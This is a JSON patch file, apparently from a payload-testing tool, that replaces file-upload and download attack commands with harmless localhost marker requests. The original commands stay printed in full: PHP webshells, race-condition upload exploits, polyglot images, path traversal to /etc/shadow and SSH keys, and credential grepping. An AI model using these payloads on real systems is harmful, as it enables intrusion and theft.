@@ -1,0 +1,346 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "file-competition",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 分析上传流程:\n# 1. 文件上传到临时目录\n# 2. 后端进行安全检查(文件类型/内容)\n# 3. 如果检查通过则保留，否则删除\n# 在步骤1和步骤3之间存在时间窗口\n\n# 测试上传响应时间(判断是否有检查延迟)\nfor i in $(seq 1 5); do\n  time curl -s -o /dev/null -w \"%{http_code}\" -F \"file=@test.jpg\" \"http://target.com/upload\"\ndone",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nMARKER_FILE=\"./payloader-fixture/PAYLOADER_MARKER.txt\"\ntest -f \"$MARKER_FILE\" || { printf \"%s\\n\" \"missing marker fixture\" >&2; exit 1; }\nfor i in 1 2 3; do\n  curl --silent --show-error --max-time 3 --output /dev/null \\\n    --write-out \"attempt=${i} status=%{http_code} total=%{time_total}\\n\" \\\n    -F \"file=@${MARKER_FILE};type=text/plain;filename=PAYLOADER_MARKER.txt\" \\\n    \"${BASE}/upload\"\ndone"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 恶意PHP文件 (shell.php):\n# <?php system($_GET[\"cmd\"]); ?>\n\n# 方法1: 使用两个终端并发操作\n# 终端1 - 持续上传:\nwhile true; do\n  curl -s -F \"file=@shell.php\" \"http://target.com/upload\" &\ndone\n\n# 终端2 - 持续访问:\nwhile true; do\n  result=$(curl -s \"http://target.com/uploads/shell.php?cmd=id\")\n  if echo \"$result\" | grep -q \"uid=\"; then\n    echo \"[+] RCE SUCCESS: $result\"\n    break\n  fi\ndone",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nMARKER_FILE=\"./payloader-fixture/PAYLOADER_MARKER.txt\"\nfor i in 1 2 3 4; do\n  token=\"PAYLOADER_MARKER_${i}\"\n  curl --silent --show-error --max-time 3 -F \"file=@${MARKER_FILE};type=text/plain;filename=${token}.txt\" \"${BASE}/upload\" >/dev/null &\n  upload_pid=$!\n  body=$(curl --silent --show-error --max-time 2 \"${BASE}/uploads/${token}.txt\" || true)\n  wait \"$upload_pid\" || true\n  [ \"$body\" = \"PAYLOADER_MARKER\" ] && printf \"marker_visible token=%s\\n\" \"$token\"\n  sleep 0.1\ndone"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "import requests\nimport threading\nimport time\n\nTARGET = \"http://target.com\"\nUPLOAD_URL = f\"{TARGET}/upload\"\nSHELL_URL = f\"{TARGET}/uploads/shell.php?cmd=id\"\n\ndef upload_loop():\n    files = {\"file\": (\"shell.php\", \"<?php system($_GET['cmd']); ?>\", \"image/jpeg\")}\n    while not stop_event.is_set():\n        try:\n            requests.post(UPLOAD_URL, files=files, timeout=2)\n        except: pass\n\ndef access_loop():\n    while not stop_event.is_set():\n        try:\n            r = requests.get(SHELL_URL, timeout=1)\n            if \"uid=\" in r.text:\n                print(f\"[+] RCE! Response: {r.text[:200]}\")\n                stop_event.set()\n                return\n        except: pass\n\nstop_event = threading.Event()\nthreads = []\nfor _ in range(10):\n    threads.append(threading.Thread(target=upload_loop))\nfor _ in range(20):\n    threads.append(threading.Thread(target=access_loop))\nfor t in threads: t.start()\ntime.sleep(60)\nstop_event.set()\nfor t in threads: t.join()",
+          "command": "import tempfile\nfrom concurrent.futures import ThreadPoolExecutor\nfrom pathlib import Path\nimport requests\n\nBASE = \"http://127.0.0.1:8080\"\nATTEMPTS = 4\n\ndef attempt(index, marker_path):\n    token = f\"PAYLOADER_MARKER_{index}\"\n    with marker_path.open(\"rb\") as handle:\n        upload = requests.post(f\"{BASE}/upload\", files={\"file\": (f\"{token}.txt\", handle, \"text/plain\")}, timeout=3)\n    read = requests.get(f\"{BASE}/uploads/{token}.txt\", timeout=2)\n    return index, upload.status_code, read.status_code, read.text == \"PAYLOADER_MARKER\"\n\nwith tempfile.TemporaryDirectory(prefix=\"payloader-race-\") as directory:\n    marker = Path(directory) / \"PAYLOADER_MARKER.txt\"\n    marker.write_text(\"PAYLOADER_MARKER\", encoding=\"utf-8\")\n    with ThreadPoolExecutor(max_workers=2) as pool:\n        results = list(pool.map(lambda i: attempt(i, marker), range(ATTEMPTS)))\n    for result in results:\n        print(result)\n    assert len(results) == ATTEMPTS"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 如果可以上传.htaccess文件(即使会被删除):\n# .htaccess内容:\nAddType application/x-httpd-php .jpg\n\n# 竞态利用:\n# 1. 先正常上传一个含PHP代码的.jpg文件\ncurl -F \"file=@shell.jpg\" \"http://target.com/upload\"\n\n# 2. 在.htaccess存在的时间窗口内访问.jpg\nwhile true; do\n  curl -s -F \"file=@.htaccess\" \"http://target.com/upload\" &\n  result=$(curl -s \"http://target.com/uploads/shell.jpg?cmd=id\")\n  [ -n \"$result\" ] && echo \"[+] $result\" && break\ndone",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nWORK=\"./payloader-fixture/race-policy\"\nmkdir -p \"$WORK\"\ntrap 'rm -rf \"$WORK\"' EXIT\nprintf \"%s\\n\" \"AddType text/plain .marker\" > \"$WORK/.htaccess\"\nprintf \"%s\" \"PAYLOADER_MARKER\" > \"$WORK/sample.marker\"\nfor i in 1 2 3; do\n  curl --silent --show-error --max-time 3 -F \"file=@$WORK/sample.marker;type=text/plain;filename=sample.marker\" \"$BASE/upload\" >/dev/null\n  curl --silent --show-error --max-time 3 -F \"file=@$WORK/.htaccess;type=text/plain;filename=.htaccess\" \"$BASE/upload\" >/dev/null &\n  policy_pid=$!\n  value=$(curl --silent --show-error --max-time 2 \"$BASE/uploads/sample.marker\" || true)\n  wait \"$policy_pid\" || true\n  [ \"$value\" = \"PAYLOADER_MARKER\" ] && printf \"text_marker_visible attempt=%s\\n\" \"$i\"\ndone"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Python并发竞态上传\nimport threading, requests\n\ndef upload_shell():\n    files = {'file': ('test.php', '<?php echo \"security_check\"; ?>', 'image/jpeg')}\n    requests.post('http://target/upload', files=files)\n\ndef access_shell():\n    r = requests.get('http://target/uploads/test.php')\n    if 'security_check' in r.text:\n        print('[+] Race won!')\n\nfor i in range(100):\n    t1 = threading.Thread(target=upload_shell)\n    t2 = threading.Thread(target=access_shell)\n    t1.start(); t2.start()",
+          "command": "import tempfile\nfrom concurrent.futures import ThreadPoolExecutor\nfrom pathlib import Path\nimport requests\n\nBASE = \"http://127.0.0.1:8080\"\nATTEMPTS = 8\n\ndef one(index, marker):\n    token = f\"PAYLOADER_MARKER_{index}\"\n    with marker.open(\"rb\") as handle:\n        upload = requests.post(f\"{BASE}/upload\", files={\"file\": (f\"{token}.txt\", handle, \"text/plain\")}, timeout=3)\n    read = requests.get(f\"{BASE}/uploads/{token}.txt\", timeout=2)\n    return upload.status_code, read.status_code, read.text == \"PAYLOADER_MARKER\"\n\nwith tempfile.TemporaryDirectory(prefix=\"payloader-marker-\") as directory:\n    marker = Path(directory) / \"PAYLOADER_MARKER.txt\"\n    marker.write_text(\"PAYLOADER_MARKER\", encoding=\"utf-8\")\n    with ThreadPoolExecutor(max_workers=2) as pool:\n        for result in pool.map(lambda i: one(i, marker), range(ATTEMPTS)):\n            print(result)"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 竞态条件上传.htaccess\nimport threading, requests\n\ndef upload_htaccess():\n    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}\n    requests.post('http://target/upload', files=files)\n\ndef upload_payload():\n    files = {'file': ('test.jpg', '<?php echo \"security_check\"; ?>', 'image/jpeg')}\n    requests.post('http://target/upload', files=files)\n\nfor i in range(50):\n    t1 = threading.Thread(target=upload_htaccess)\n    t2 = threading.Thread(target=upload_payload)\n    t1.start(); t2.start()",
+          "command": "import tempfile\nfrom concurrent.futures import ThreadPoolExecutor\nfrom pathlib import Path\nimport requests\n\nBASE = \"http://127.0.0.1:8080\"\n\ndef upload(path, name):\n    with path.open(\"rb\") as handle:\n        return requests.post(f\"{BASE}/upload\", files={\"file\": (name, handle, \"text/plain\")}, timeout=3).status_code\n\nwith tempfile.TemporaryDirectory(prefix=\"payloader-htaccess-\") as directory:\n    root = Path(directory)\n    policy = root / \".htaccess\"\n    marker = root / \"PAYLOADER_MARKER.marker\"\n    policy.write_text(\"AddType text/plain .marker\\n\", encoding=\"utf-8\")\n    marker.write_text(\"PAYLOADER_MARKER\", encoding=\"utf-8\")\n    for _ in range(4):\n        with ThreadPoolExecutor(max_workers=2) as pool:\n            print(list(pool.map(lambda args: upload(*args), [(policy, \".htaccess\"), (marker, marker.name)])))"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 利用分块传输延长上传时间窗口\nimport socket, time\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('target', 80))\n\nheaders = (\n    \"POST /upload HTTP/1.1\\r\\n\"\n    \"Host: target\\r\\n\"\n    \"Transfer-Encoding: chunked\\r\\n\"\n    \"Content-Type: multipart/form-data; boundary=abc\\r\\n\\r\\n\"\n)\nsock.send(headers.encode())\n\n# 缓慢发送分块数据，延长文件存在时间\nchunks = [\"5\\r\\nhello\\r\\n\", \"5\\r\\nworld\\r\\n\", \"0\\r\\n\\r\\n\"]\nfor chunk in chunks:\n    sock.send(chunk.encode())\n    time.sleep(0.5)",
+          "command": "import socket\n\nhost, port = \"127.0.0.1\", 8080\nboundary = \"PAYLOADER_BOUNDARY\"\nbody = (\n    f\"--{boundary}\\r\\n\"\n    'Content-Disposition: form-data; name=\"file\"; filename=\"PAYLOADER_MARKER.txt\"\\r\\n'\n    \"Content-Type: text/plain\\r\\n\\r\\n\"\n    f\"PAYLOADER_MARKER\\r\\n--{boundary}--\\r\\n\"\n).encode(\"ascii\")\nheaders = (\n    \"POST /upload HTTP/1.1\\r\\n\"\n    f\"Host: {host}:{port}\\r\\n\"\n    \"Transfer-Encoding: chunked\\r\\n\"\n    f\"Content-Type: multipart/form-data; boundary={boundary}\\r\\n\"\n    \"Connection: close\\r\\n\\r\\n\"\n).encode(\"ascii\")\nwith socket.create_connection((host, port), timeout=3) as sock:\n    sock.sendall(headers)\n    for offset in range(0, len(body), 16):\n        chunk = body[offset:offset + 16]\n        sock.sendall(f\"{len(chunk):X}\\r\\n\".encode(\"ascii\") + chunk + b\"\\r\\n\")\n    sock.sendall(b\"0\\r\\n\\r\\n\")\n    print(sock.recv(4096).decode(\"latin-1\", errors=\"replace\"))"
+        }
+      ]
+    },
+    {
+      "id": "file-download",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 常见文件下载URL模式:\ncurl -v \"http://target.com/download?file=report.pdf\"\ncurl -v \"http://target.com/download.php?path=uploads/doc.pdf\"\ncurl -v \"http://target.com/api/file/read?name=image.jpg\"\ncurl -v \"http://target.com/export?filename=data.csv\"\ncurl -v \"http://target.com/attachment/get/123\"",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/download?file=PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/download.php?path=fixtures/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/api/file/read?name=PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/export?filename=PAYLOADER_MARKER.csv\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/attachment/get/PAYLOADER_MARKER_ID\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Linux敏感文件:\ncurl \"http://target.com/download?file=../../../etc/passwd\"\ncurl \"http://target.com/download?file=....//....//....//etc/shadow\"\ncurl \"http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\ncurl \"http://target.com/download?file=..%252f..%252f..%252fetc/passwd\"\n\n# Windows敏感文件:\ncurl \"http://target.com/download?file=......windowswin.ini\"\ncurl \"http://target.com/download?file=......windowssystem32configSAM\"\n\n# Web应用配置文件:\ncurl \"http://target.com/download?file=../WEB-INF/web.xml\"\ncurl \"http://target.com/download?file=../application.properties\"\ncurl \"http://target.com/download?file=../.env\"\ncurl \"http://target.com/download?file=../config/database.yml\"",
+          "command": "BASE=\"http://127.0.0.1:8080/download?file=\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}....//outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}..%5coutside%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../documents/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Java应用关键文件:\ncurl \"http://target.com/download?file=../../WEB-INF/web.xml\" -o web.xml\ncurl \"http://target.com/download?file=../../WEB-INF/classes/application.yml\" -o app.yml\ncurl \"http://target.com/download?file=../../WEB-INF/classes/db.properties\" -o db.properties\n\n# PHP应用:\ncurl \"http://target.com/download?file=../../config.php\" -o config.php\ncurl \"http://target.com/download?file=../../.env\" -o .env\n\n# Node.js应用:\ncurl \"http://target.com/download?file=../../package.json\" -o package.json\ncurl \"http://target.com/download?file=../../.env\" -o .env\n\n# 提取数据库凭证:\ngrep -iE \"password|passwd|pwd|secret|key|db_|database|mysql|postgres\" *.yml *.xml *.properties *.env 2>/dev/null",
+          "command": "BASE=\"http://127.0.0.1:8080/download?file=\"\nWORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.yml\" -o \"$WORK/marker.yml\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.xml\" -o \"$WORK/marker.xml\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.properties\" -o \"$WORK/marker.properties\"\ngrep --fixed-strings --files-with-matches \"PAYLOADER_MARKER\" \"$WORK\"/*"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "#!/bin/bash\n# 批量测试常见敏感文件路径\nBASE=\"http://target.com/download?file=\"\nFILES=(\n  \"../../../etc/passwd\" \"../../../etc/shadow\" \"../../../etc/hosts\"\n  \"../../../proc/self/environ\" \"../../../proc/self/cmdline\"\n  \"../../WEB-INF/web.xml\" \"../../WEB-INF/classes/application.properties\"\n  \"../../.env\" \"../../config.php\" \"../../web.config\"\n  \"../../../root/.ssh/id_rsa\" \"../../../root/.bash_history\"\n  \"../../../var/log/apache2/access.log\"\n)\n\nfor f in \"${FILES[@]}\"; do\n  resp=$(curl -s -o /dev/null -w \"%{http_code}:%{size_download}\" \"${BASE}${f}\")\n  code=$(echo $resp | cut -d: -f1)\n  size=$(echo $resp | cut -d: -f2)\n  if [ \"$code\" == \"200\" ] && [ \"$size\" -gt 0 ]; then\n    echo \"[+] FOUND: $f (HTTP $code, $size bytes)\"\n    curl -s \"${BASE}${f}\" -o \"loot_$(echo $f | tr '/' '_')\"\n  fi\ndone",
+          "command": "BASE=\"http://127.0.0.1:8080/download?file=\"\nWORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nFILES=(\"../outside/PAYLOADER_MARKER.txt\" \"../outside/PAYLOADER_MARKER.json\" \"../outside/PAYLOADER_MARKER.xml\")\nfor file in \"${FILES[@]}\"; do\n  output=\"$WORK/$(basename \"$file\")\"\n  if curl --fail --silent --show-error --max-time 3 \"${BASE}${file}\" -o \"$output\"; then\n    grep --fixed-strings --quiet \"PAYLOADER_MARKER\" \"$output\" && printf \"marker_read path=%s\\n\" \"$file\"\n  fi\ndone"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 双重编码../\n?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd\n?file=%252e%252e%255cetc%255cpasswd\n\n# Unicode编码变体\n?file=..%c0%af..%c0%afetc/passwd\n?file=..%ef%bc%8f..%ef%bc%8fetc/passwd\n\n# 混合编码\n?file=..%2f..%2f..%2fetc%2fpasswd\n?file=....//....//etc/passwd",
+          "command": "?file=%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\n?file=%252e%252e%255coutside%255cPAYLOADER_MARKER.txt\n\n?file=%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\n?file=....//outside/PAYLOADER_MARKER.txt\n?file=..%5coutside%5cPAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 常见文件下载参数名Fuzz\n?path=../../etc/passwd\n?filepath=../../etc/passwd\n?filename=../../etc/passwd\n?doc=../../etc/passwd\n?download=../../etc/passwd\n?src=../../etc/passwd\n?url=file:///etc/passwd\n\n# 利用URL协议\n?file=file:///etc/passwd\n?file=php://filter/convert.base64-encode/resource=config.php",
+          "command": "?path=../outside/PAYLOADER_MARKER.txt\n?filepath=../outside/PAYLOADER_MARKER.txt\n?filename=../outside/PAYLOADER_MARKER.txt\n?doc=../outside/PAYLOADER_MARKER.txt\n?download=../outside/PAYLOADER_MARKER.txt\n?src=../outside/PAYLOADER_MARKER.txt\n?url=file:///tmp/payloader-fixture/PAYLOADER_MARKER.txt\n\n?file=file:///tmp/payloader-fixture/PAYLOADER_MARKER.txt\n?file=php://filter/convert.base64-encode/resource=/tmp/payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 空字节截断（PHP < 5.3.4）\n?file=../../etc/passwd%00\n?file=../../etc/passwd%00.jpg\n\n# 路径截断（Windows长路径）\n?file=../../etc/passwd..............................................................\n\n# 点斜杠混淆\n?file=....//....//....//etc/passwd\n?file=..;/..;/..;/etc/passwd\n?file=..\\..\\..\\etc\\passwd",
+          "command": "?file=../outside/PAYLOADER_MARKER.txt%00\n?file=../outside/PAYLOADER_MARKER.txt%00.txt\n\n?file=../outside/PAYLOADER_MARKER.txt................................\n\n?file=....//outside/PAYLOADER_MARKER.txt\n?file=..;/outside/PAYLOADER_MARKER.txt\n?file=..%5coutside%5cPAYLOADER_MARKER.txt"
+        }
+      ]
+    },
+    {
+      "id": "file-mime",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 测试不同的上传方式判断检查点:\n\n# 1. 正常上传(应该成功):\ncurl -F \"file=@test.jpg;type=image/jpeg\" \"http://target.com/upload\"\n\n# 2. 修改Content-Type(判断是否仅检查MIME):\ncurl -F \"file=@shell.php;type=image/jpeg\" \"http://target.com/upload\"\n\n# 3. 修改扩展名(判断是否检查扩展名):\ncurl -F \"file=@shell.jpg;type=application/x-php\" \"http://target.com/upload\"\n\n# 4. 仅修改文件头(判断是否检查Magic Bytes):\n# GIF89a开头的PHP:\nprintf \"GIF89a<?php system($_GET['cmd']); ?>\" > shell.gif\ncurl -F \"file=@shell.gif;type=image/gif\" \"http://target.com/upload\"",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nWORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nprintf \"%s\" \"PAYLOADER_MARKER\" > \"$WORK/marker.txt\"\ncp \"$WORK/marker.txt\" \"$WORK/marker.jpg\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$WORK/marker.jpg;type=image/jpeg\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$WORK/marker.txt;type=image/jpeg;filename=PAYLOADER_MARKER.txt\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$WORK/marker.jpg;type=text/plain;filename=PAYLOADER_MARKER.jpg\" \"$BASE/upload\"\nprintf \"GIF89aPAYLOADER_MARKER\" > \"$WORK/marker.gif\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$WORK/marker.gif;type=image/gif;filename=PAYLOADER_MARKER.gif\" \"$BASE/upload\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 将PHP webshell的Content-Type伪造为图片:\ncurl -X POST \"http://target.com/upload\"   -F \"file=@shell.php;type=image/jpeg;filename=shell.php\"\n\n# 如果服务端同时检查扩展名，使用双扩展名:\ncurl -F \"file=@shell.php;type=image/jpeg;filename=shell.php.jpg\" \"http://target.com/upload\"\ncurl -F \"file=@shell.php;type=image/png;filename=shell.jpg.php\" \"http://target.com/upload\"\n\n# Apache多扩展名解析:\ncurl -F \"file=@shell.php;type=image/jpeg;filename=shell.php.abc\" \"http://target.com/upload\"\n\n# Nginx解析漏洞:\ncurl -F \"file=@shell.jpg;type=image/jpeg\" \"http://target.com/upload\"\ncurl \"http://target.com/uploads/shell.jpg/.php\"",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nMARKER=\"./payloader-fixture/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$MARKER;type=image/jpeg;filename=PAYLOADER_MARKER.txt\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$MARKER;type=image/jpeg;filename=PAYLOADER_MARKER.txt.jpg\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$MARKER;type=image/png;filename=PAYLOADER_MARKER.jpg.txt\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$MARKER;type=image/jpeg;filename=PAYLOADER_MARKER.txt.bin\" \"$BASE/upload\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/uploads/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 在PHP文件前添加各种文件头:\n\n# JPEG文件头:\nprintf \"ÿØÿà\u0000\u0010JFIF\" > shell.php\necho \"<?php system($_GET['cmd']); ?>\" >> shell.php\n\n# PNG文件头:\nprintf \"PNG\r\n\u001a\n\" > shell.php\necho \"<?php system($_GET['cmd']); ?>\" >> shell.php\n\n# GIF文件头:\nprintf \"GIF89a\" > shell.php\necho \"<?php system($_GET['cmd']); ?>\" >> shell.php\n\n# BMP文件头:\nprintf \"BM\" > shell.php\necho \"<?php system($_GET['cmd']); ?>\" >> shell.php\n\n# 上传:\ncurl -F \"file=@shell.php;type=image/jpeg;filename=shell.php\" \"http://target.com/upload\"",
+          "command": "import tempfile\nfrom pathlib import Path\n\nfixtures = {\n    \"marker.jpg\": bytes.fromhex(\"FFD8FFE000104A464946\") + b\"PAYLOADER_MARKER\",\n    \"marker.png\": bytes.fromhex(\"89504E470D0A1A0A\") + b\"PAYLOADER_MARKER\",\n    \"marker.gif\": b\"GIF89aPAYLOADER_MARKER\",\n    \"marker.bmp\": b\"BM\" + (54).to_bytes(4, \"little\") + b\"\\x00\" * 48 + b\"PAYLOADER_MARKER\",\n}\nwith tempfile.TemporaryDirectory(prefix=\"payloader-signature-\") as directory:\n    root = Path(directory)\n    for name, data in fixtures.items():\n        path = root / name\n        path.write_bytes(data)\n        assert path.read_bytes().endswith(b\"PAYLOADER_MARKER\")\n        print(name, len(data), data[:12].hex())"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 确认文件上传路径:\ncurl -v \"http://target.com/uploads/shell.php\"\n\n# 执行命令:\ncurl \"http://target.com/uploads/shell.php?cmd=id\"\ncurl \"http://target.com/uploads/shell.php?cmd=cat+/etc/passwd\"\n\n# 如果无法直接访问，尝试其他路径:\ncurl \"http://target.com/upload/files/shell.php?cmd=id\"\ncurl \"http://target.com/static/uploads/shell.php?cmd=id\"\ncurl \"http://target.com/resources/shell.php?cmd=id\"",
+          "command": "BASE=\"http://127.0.0.1:8080\"\nOBJECT=\"PAYLOADER_MARKER_ID\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/uploads/$OBJECT\"\nbody=$(curl --fail --silent --show-error --max-time 3 \"$BASE/uploads/$OBJECT\")\nprintf \"%s\" \"$body\" | grep --fixed-strings --quiet \"PAYLOADER_MARKER\"\nprintf \"marker_object_verified id=%s\\n\" \"$OBJECT\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# GIF+PHP Polyglot\nGIF89a<?php echo \"security_check\"; ?>\n\n# PNG+PHP Polyglot（使用exiftool注入）\nexiftool -Comment='<?php echo \"security_check\"; ?>' test.png\nmv test.png test.php.png\n\n# JPEG Polyglot\nexiftool -DocumentName='<?php echo \"security_check\"; ?>' test.jpg\n\n# BMP+PHP\npython3 -c \"import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\\x00'*46+b'<?php echo \\\"security_check\\\"; ?>')\"",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\npython3 - \"$WORK\" <<'PY'\nimport base64, pathlib, sys\nroot = pathlib.Path(sys.argv[1])\nroot.joinpath(\"marker.png\").write_bytes(base64.b64decode(\"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\"))\nPY\nexiftool -overwrite_original -Comment=\"PAYLOADER_MARKER\" \"$WORK/marker.png\"\ncp \"$WORK/marker.png\" \"$WORK/PAYLOADER_MARKER.png\"\npython3 -c \"from pathlib import Path; p=Path('$WORK/marker.bmp'); p.write_bytes(b'BM'+(54).to_bytes(4,'little')+b'\\x00'*48+b'PAYLOADER_MARKER')\"\nexiftool -Comment \"$WORK/marker.png\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 多个Content-Type头\nPOST /upload HTTP/1.1\nContent-Type: image/jpeg\nContent-Type: application/x-php\n\n# boundary混淆\nContent-Type: multipart/form-data; boundary=abc; boundary=xyz\n\n# 大小写混淆MIME类型\nContent-Type: Image/JPEG\nContent-Type: image/JPEG; charset=utf-8\n\n# 添加额外参数\nContent-Type: image/jpeg; name=\"test.php\"",
+          "command": "import socket\n\nhost, port = \"127.0.0.1\", 8080\nboundary = \"PAYLOADER_BOUNDARY\"\nbody = (\n    f\"--{boundary}\\r\\n\"\n    'Content-Disposition: form-data; name=\"file\"; filename=\"PAYLOADER_MARKER.txt\"\\r\\n'\n    \"Content-Type: text/plain\\r\\n\\r\\n\"\n    f\"PAYLOADER_MARKER\\r\\n--{boundary}--\\r\\n\"\n).encode(\"ascii\")\nrequest = (\n    \"POST /upload HTTP/1.1\\r\\n\"\n    f\"Host: {host}:{port}\\r\\n\"\n    f\"Content-Type: multipart/form-data; boundary={boundary}\\r\\n\"\n    f\"Content-Length: {len(body)}\\r\\n\"\n    \"Connection: close\\r\\n\\r\\n\"\n).encode(\"ascii\") + body\nwith socket.create_connection((host, port), timeout=3) as sock:\n    sock.sendall(request)\n    print(sock.recv(4096).decode(\"latin-1\", errors=\"replace\"))"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# EXIF Comment注入\nexiftool -Comment='<?php system(\"id\"); ?>' photo.jpg\n\n# XMP元数据注入\nexiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg\n\n# ICC Profile注入\nexiftool -ICC_Profile:ProfileDescription='<?php echo \"security_check\"; ?>' photo.jpg\n\n# 上传后配合文件包含利用\n# http://target/include.php?file=uploads/photo.jpg",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\ncp \"./payloader-fixture/fixture.jpg\" \"$WORK/marker.jpg\"\nexiftool -overwrite_original -Comment=\"PAYLOADER_MARKER\" \"$WORK/marker.jpg\"\nexiftool -overwrite_original -XMP-dc:Description=\"PAYLOADER_MARKER\" \"$WORK/marker.jpg\"\nexiftool -overwrite_original -ICC_Profile:ProfileDescription=\"PAYLOADER_MARKER\" \"$WORK/marker.jpg\" || true\nexiftool -json -Comment -XMP-dc:Description -ICC_Profile:ProfileDescription \"$WORK/marker.jpg\"\ngrep --binary-files=text --fixed-strings \"PAYLOADER_MARKER\" \"$WORK/marker.jpg\" >/dev/null"
+        }
+      ]
+    },
+    {
+      "id": "file-null-byte",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 空字节截断受影响的环境:\n# - PHP < 5.3.4 (底层C函数将\u0000视为字符串结尾)\n# - Java旧版本的File类\n# - 部分Python 2.x版本\n# - 使用C/C++扩展的程序\n\n# 检测PHP版本:\ncurl -sI \"http://target.com/\" | grep -i \"x-powered-by|server\"\ncurl -s \"http://target.com/phpinfo.php\" | grep -i \"php version\"",
+          "command": "php -r 'printf(\"php=%s integer_size=%d\\\\n\", PHP_VERSION, PHP_INT_SIZE);'\npython3 -c \"import platform,sys; print(f'python={sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro} platform={platform.system()}')\"\nnode -e \"console.log(`node=${process.versions.node} platform=${process.platform}`)\"\nprintf \"%s\\n\" \"fixture=PAYLOADER_MARKER\"\nprintf \"%s\\n\" \"requirement=byte-level request capture and final-path audit\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
